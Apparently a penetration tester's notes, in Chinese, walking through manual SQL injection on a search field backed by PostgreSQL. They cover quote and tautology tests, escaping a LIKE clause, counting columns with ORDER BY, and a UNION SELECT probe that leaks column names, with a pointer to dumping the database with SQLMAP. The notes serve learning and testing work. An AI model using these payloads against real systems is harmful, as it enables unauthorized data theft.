测试 SQLi
- 测试单个/双重单引号
    - 单引号
        `search=bo'ss`
        - 得到 
            ```http
            HTTP/1.1 500 Internal Server Error

            pq: syntax error at or near "ss"
            ```
            - `pq` 似乎对应 PostgreSQL 

    - 双重单引号
        `search=bo''ss`
        - 响应
            ```html
            <span class="title is-3">
                Search: bo&#39;&#39;ss
            </span>
            ```
            - 单引号被 HTML 编码后返回
    - 存在 SQLi

- 测试真
    ```sql
    search='' OR 1=1 OR 'a'='a'
    ```
    - 得到全部

- 测试注释
    - 横杠
        ```sql
        search='' OR 1=1 -- 
        ```
        - `pq: syntax error at end of input`

    - 井号
        ```sql
        search='' OR 1=1 OR 'a'='a' # 
        ```
        - `pq: syntax error at or near "%"`

            - 当前上下文为 LIKE 

- 测试上下文
    - 通配
        ```sql
        search=%
        ```
        - 得到所有条目

    - 逃逸
        ```sql
        (LIKE '%%') --
        ```
        - 返回所有条目

- 测试查询结果列数
    ```sql
    (LIKE '%%') ORDER BY 3 --
    ```
    - 列数 3

- 测试设置原查询为空
    ```sql
    (LIKE '%' AND 1=0) --
    ```
    - 得到空查询结果

- 设置 NULL 联合查询
    ```sql
    (LIKE '%' AND 1=0) UNION SELECT NULL,NULL,NULL --
    ```
    - 得到 500 响应
        ```log
        sql: Scan error on column index 0, name "id": converting NULL to int is unsupported
        ```
        - 得到列名
    
    - 分支：继续尝试手动联合查询或使用基于错误的查询，或使用 SQLMAP 转储数据库

- 继续一系列探测

        ```sql
        SELECT id ... FROM ... WHERE ... (LIKE '%' AND 1=0) UNION SELECT 0,NULL,NULL --
        ```
